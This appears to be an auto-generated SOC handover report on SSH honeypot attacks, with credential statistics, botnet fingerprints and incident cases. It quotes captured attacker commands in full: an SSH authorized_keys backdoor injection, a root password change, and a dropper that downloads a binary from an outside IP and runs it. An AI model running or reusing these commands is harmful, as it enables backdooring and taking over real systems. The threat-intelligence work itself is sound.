# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T13:13:42Z |
| **Shift Time** | 13:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **319** |
| Confirmed Threats | **292** |
| False Positives Filtered | **27** (8.5%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **14** |
| High Severity Cases | **98** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **221** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **261** |
| Unique Credential Pairs | **155** |
| Unique Usernames | **60** |
| Unique Passwords | **148** |
| Successful Auth Pairs | **58** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 98 |
| `345gs5662d34` | 48 |
| `ubuntu` | 11 |
| `user` | 8 |
| `test` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 48 |
| `3245gs5662d34` | 48 |
| `1234` | 4 |
| `123456` | 3 |
| `sysadmin@1` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 48 |
| `root` | `3245gs5662d34` | 48 |
| `sysadmin` | `sysadmin@1` | 2 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa@123456` | `101.200.132.92` | 2026-04-25T10:59:52 |
| `root` | `789456123` | `187.174.238.116` | 2026-04-25T11:10:54 |
| `root` | `3245gs5662d34` | `187.174.238.116` | 2026-04-25T11:11:02 |
| `root` | `123@Root` | `187.174.238.116` | 2026-04-25T11:13:34 |
| `root` | `1q2w3e4r5t6y7u8i9o0p` | `187.174.238.116` | 2026-04-25T11:14:25 |
| `root` | `root@root` | `187.174.238.116` | 2026-04-25T11:15:16 |
| `root` | `a4b3c2d1` | `165.154.1.18` | 2026-04-25T11:19:50 |
| `root` | `3245gs5662d34` | `165.154.1.18` | 2026-04-25T11:19:53 |
| `root` | `traffic` | `187.174.238.116` | 2026-04-25T11:22:20 |
| `root` | `developer` | `187.174.238.116` | 2026-04-25T11:25:04 |
| `root` | `3edc#EDC3edc` | `187.174.238.116` | 2026-04-25T11:25:57 |
| `root` | `Admin123789` | `187.174.238.116` | 2026-04-25T11:27:40 |
| `root` | `1234Pass` | `165.154.1.18` | 2026-04-25T11:30:33 |
| `root` | `Aa111222` | `165.154.1.18` | 2026-04-25T11:31:31 |
| `root` | `Hj@123456` | `165.154.1.18` | 2026-04-25T11:32:30 |
| `root` | `Hola1234` | `165.154.1.18` | 2026-04-25T11:33:30 |
| `root` | `Xy123456@` | `159.203.181.139` | 2026-04-25T12:14:38 |
| `root` | `3245gs5662d34` | `159.203.181.139` | 2026-04-25T12:14:43 |
| `root` | `1234abcd` | `159.203.181.139` | 2026-04-25T12:15:38 |
| `root` | `Admin@2026` | `123.59.7.18` | 2026-04-25T12:17:32 |
| `root` | `3245gs5662d34` | `123.59.7.18` | 2026-04-25T12:17:35 |
| `root` | `ABCabc@123` | `159.203.181.139` | 2026-04-25T12:21:40 |
| `root` | `aa@159357` | `101.126.89.35` | 2026-04-25T12:23:38 |
| `root` | `1Qazxsw23edc` | `159.203.181.139` | 2026-04-25T12:25:56 |
| `root` | `password` | `102.88.137.213` | 2026-04-25T12:27:38 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-04-25T12:27:45 |
| `root` | `P@33w0rd` | `102.88.137.213` | 2026-04-25T12:28:44 |
| `root` | `root1234!@` | `102.88.137.213` | 2026-04-25T12:29:48 |
| `root` | `ZAQ!2wsx2024$` | `102.88.137.213` | 2026-04-25T12:30:52 |
| `root` | `qwerty1` | `102.88.137.213` | 2026-04-25T12:31:58 |
| `root` | `changeme` | `159.203.181.139` | 2026-04-25T12:32:45 |
| `root` | `asdfg` | `159.203.181.139` | 2026-04-25T12:33:40 |
| `root` | `nPSpP4PBW0` | `170.79.37.88` | 2026-04-25T12:33:50 |
| `root` | `3245gs5662d34` | `170.79.37.88` | 2026-04-25T12:33:57 |
| `root` | `Admin@2026` | `170.79.37.88` | 2026-04-25T12:34:31 |
| `root` | `P@ssw0rd1!` | `159.203.181.139` | 2026-04-25T12:34:32 |
| `root` | `BBqq111` | `170.79.37.88` | 2026-04-25T12:36:45 |
| `root` | `Apple2026` | `170.79.37.88` | 2026-04-25T12:37:40 |
| `root` | `nPSpP4PBW0` | `102.88.137.213` | 2026-04-25T12:38:31 |
| `root` | `chris` | `139.59.112.10` | 2026-04-25T12:39:12 |
| `root` | `3245gs5662d34` | `139.59.112.10` | 2026-04-25T12:39:14 |
| `root` | `Ld123456` | `170.79.37.88` | 2026-04-25T12:39:38 |
| `root` | `admin888` | `139.59.112.10` | 2026-04-25T12:41:02 |
| `root` | `Aa112211.` | `170.79.37.88` | 2026-04-25T12:42:28 |
| `root` | `Aa112211.` | `102.88.137.213` | 2026-04-25T12:43:01 |
| `root` | `aa@159357` | `170.79.37.88` | 2026-04-25T12:43:29 |
| `root` | `Qwerty111111` | `170.79.37.88` | 2026-04-25T12:43:57 |
| `root` | `Abcd12345#` | `102.88.137.213` | 2026-04-25T12:47:24 |
| `root` | `Qwer!` | `102.88.137.213` | 2026-04-25T12:48:31 |
| `root` | `MoeClub.org` | `139.59.112.10` | 2026-04-25T12:50:13 |
| `root` | `Qwertyuiop1234567` | `102.88.137.213` | 2026-04-25T12:50:40 |
| `root` | `woaini123` | `139.59.112.10` | 2026-04-25T12:51:16 |
| `root` | `2glehe5t24th1issZs` | `139.59.112.10` | 2026-04-25T12:53:22 |
| `root` | `Qazwsx2026@` | `45.78.198.204` | 2026-04-25T12:54:47 |
| `root` | `3245gs5662d34` | `45.78.198.204` | 2026-04-25T12:54:50 |
| `root` | `Qwe123!!` | `139.59.112.10` | 2026-04-25T12:55:14 |
| `root` | `8866` | `139.59.112.10` | 2026-04-25T12:56:11 |
| `root` | `qq147258` | `139.59.112.10` | 2026-04-25T13:00:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **319** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 283 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 246 | 9 |
| `03a80b21afa8...` | Modern SSH client | 30 | 5 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `f555226df196...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 246 | 9 | libssh-based |
| `03a80b21afa8...` | libssh | 30 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 48 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:PWAmrFYZYr2P"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.89.35`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.1.18`, `159.203.181.139`, `45.78.198.204`, `187.174.238.116`, `102.88.137.213`, `139.59.112.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **25** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS201749` | SUPER CELL NETWORK FOR INTERNET SERVICES LTD | 2 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |
| `AS17488` | Hathway IP Over Cable Internet | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (98)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-056a9e28cf1b

| Field | Detail |
|---|---|
| **Source IP** | `101.200.132[.]92` |
| **First Seen** | 2026-04-25 10:59 |
| **Last Seen** | 2026-04-25 10:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://47.83.203[.]183:60138/arm_linux -o /tmp/6Vg2oElk3t; if [ ! -f /tmp/6Vg2oElk3t ]; then wget hxxp://47.83.203[.]183:60138/arm_linux -O /tmp/6Vg2oElk3t; fi; if [ ! -f /tmp/6Vg2oElk3t ]; then exec 6<>/dev/tcp/47.83.203[.]183/60138 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6Vg2oElk3t ; chmod +x /tmp/6Vg2oElk3t && /tmp/6Vg2oElk3t /21X3i7bVnmcg39VxznQWXuCg31TyTjHUX+AnHxU3S7YVn2IhH1S2DHJV3qcg39RxzHYUGODgHdV2THZWm2GgWNS2TDHUH+cgHVZ3zDYUH6ShnpN0TPHUX2BnHxb2jrfU3yBim1S2zTHUX+HnHxR2y7YVn, head -c 2639612 > /tmp/o7nZepLgSK, nohup $SHELL -c "curl hxxp://47.83.203[.]183:60138/arm_linux -o /tmp/6Vg2oElk3t; if [ ! -f /tmp/6Vg2oElk3t ]; then wget hxxp://47.83.203[.]183:60138/arm_linux -O /tmp/6Vg2oElk3t; fi; if [ ! -f /tmp/6Vg2oElk3t ]; then exec 6<>/dev/tcp/47.83.203[.]183/60138 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6Vg2oElk3t ; chmod +x /tmp/6Vg2oElk3t && /tmp/6Vg2oElk3t /21X3i7bVnmcg39VxznQWXuCg31TyTjHUX+AnHxU3S7YVn2IhH1S2DHJV3qcg39RxzHYUGODgHdV2THZWm2GgWNS2TDHUH+cgHVZ3zDYUH6ShnpN0TPHUX2BnHxb2jrfU3yBim1S2zTHUX+HnHxR2y7YVn, (vXZXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:59:52` | `cowrie.session.connect` |
| `2026-04-25 10:59:52` | `cowrie.client.version` |
| `2026-04-25 10:59:52` | `cowrie.client.kex` |
| `2026-04-25 10:59:52` | `cowrie.login.success` |
| `2026-04-25 10:59:53` | `cowrie.session.params` |
| `2026-04-25 10:59:53` | `cowrie.command.input` |
| `2026-04-25 10:59:56` | `cowrie.command.input` |
| `2026-04-25 10:59:56` | `cowrie.command.input` |
| `2026-04-25 10:59:56` | `cowrie.command.input` |
| `2026-04-25 10:59:56` | `cowrie.command.input` |
| `2026-04-25 10:59:56` | `cowrie.log.closed` |
| `2026-04-25 10:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.200.132[.]92` to AbuseIPDB if not already reported
- [ ] Block `101.200.132[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbaaca7d9372

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:10 |
| **Last Seen** | 2026-04-25 11:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:10:52` | `cowrie.session.connect` |
| `2026-04-25 11:10:52` | `cowrie.client.version` |
| `2026-04-25 11:10:52` | `cowrie.client.kex` |
| `2026-04-25 11:10:54` | `cowrie.login.success` |
| `2026-04-25 11:10:54` | `cowrie.session.params` |
| `2026-04-25 11:10:54` | `cowrie.command.input` |
| `2026-04-25 11:10:54` | `cowrie.command.failed` |
| `2026-04-25 11:10:55` | `cowrie.log.closed` |
| `2026-04-25 11:10:55` | `cowrie.session.params` |
| `2026-04-25 11:10:55` | `cowrie.command.input` |
| `2026-04-25 11:10:56` | `cowrie.session.file_download` |
| `2026-04-25 11:10:56` | `cowrie.log.closed` |
| `2026-04-25 11:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f310009cfbd2

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:11 |
| **Last Seen** | 2026-04-25 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:11:00` | `cowrie.session.connect` |
| `2026-04-25 11:11:00` | `cowrie.client.version` |
| `2026-04-25 11:11:01` | `cowrie.client.kex` |
| `2026-04-25 11:11:02` | `cowrie.login.success` |
| `2026-04-25 11:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a6c28bc613

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:13 |
| **Last Seen** | 2026-04-25 11:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:13:33` | `cowrie.session.connect` |
| `2026-04-25 11:13:33` | `cowrie.client.version` |
| `2026-04-25 11:13:33` | `cowrie.client.kex` |
| `2026-04-25 11:13:34` | `cowrie.login.success` |
| `2026-04-25 11:13:35` | `cowrie.session.params` |
| `2026-04-25 11:13:35` | `cowrie.command.input` |
| `2026-04-25 11:13:35` | `cowrie.command.failed` |
| `2026-04-25 11:13:35` | `cowrie.log.closed` |
| `2026-04-25 11:13:36` | `cowrie.session.params` |
| `2026-04-25 11:13:36` | `cowrie.command.input` |
| `2026-04-25 11:13:36` | `cowrie.session.file_download` |
| `2026-04-25 11:13:36` | `cowrie.log.closed` |
| `2026-04-25 11:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d5e9c28916

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:13 |
| **Last Seen** | 2026-04-25 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:13:40` | `cowrie.session.connect` |
| `2026-04-25 11:13:40` | `cowrie.client.version` |
| `2026-04-25 11:13:40` | `cowrie.client.kex` |
| `2026-04-25 11:13:41` | `cowrie.login.success` |
| `2026-04-25 11:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67257e7776e2

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:14 |
| **Last Seen** | 2026-04-25 11:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:14:23` | `cowrie.session.connect` |
| `2026-04-25 11:14:23` | `cowrie.client.version` |
| `2026-04-25 11:14:24` | `cowrie.client.kex` |
| `2026-04-25 11:14:25` | `cowrie.login.success` |
| `2026-04-25 11:14:25` | `cowrie.session.params` |
| `2026-04-25 11:14:25` | `cowrie.command.input` |
| `2026-04-25 11:14:25` | `cowrie.command.failed` |
| `2026-04-25 11:14:26` | `cowrie.log.closed` |
| `2026-04-25 11:14:26` | `cowrie.session.params` |
| `2026-04-25 11:14:26` | `cowrie.command.input` |
| `2026-04-25 11:14:27` | `cowrie.session.file_download` |
| `2026-04-25 11:14:27` | `cowrie.log.closed` |
| `2026-04-25 11:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a8b0e468bd6

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:14 |
| **Last Seen** | 2026-04-25 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:14:30` | `cowrie.session.connect` |
| `2026-04-25 11:14:30` | `cowrie.client.version` |
| `2026-04-25 11:14:31` | `cowrie.client.kex` |
| `2026-04-25 11:14:32` | `cowrie.login.success` |
| `2026-04-25 11:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c89d73b8ba1

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:15 |
| **Last Seen** | 2026-04-25 11:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:15:14` | `cowrie.session.connect` |
| `2026-04-25 11:15:14` | `cowrie.client.version` |
| `2026-04-25 11:15:14` | `cowrie.client.kex` |
| `2026-04-25 11:15:16` | `cowrie.login.success` |
| `2026-04-25 11:15:16` | `cowrie.session.params` |
| `2026-04-25 11:15:16` | `cowrie.command.input` |
| `2026-04-25 11:15:16` | `cowrie.command.failed` |
| `2026-04-25 11:15:17` | `cowrie.log.closed` |
| `2026-04-25 11:15:17` | `cowrie.session.params` |
| `2026-04-25 11:15:17` | `cowrie.command.input` |
| `2026-04-25 11:15:18` | `cowrie.session.file_download` |
| `2026-04-25 11:15:18` | `cowrie.log.closed` |
| `2026-04-25 11:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f251c492258b

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:15 |
| **Last Seen** | 2026-04-25 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:15:21` | `cowrie.session.connect` |
| `2026-04-25 11:15:21` | `cowrie.client.version` |
| `2026-04-25 11:15:21` | `cowrie.client.kex` |
| `2026-04-25 11:15:23` | `cowrie.login.success` |
| `2026-04-25 11:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a26f3dc53cd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:19 |
| **Last Seen** | 2026-04-25 11:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
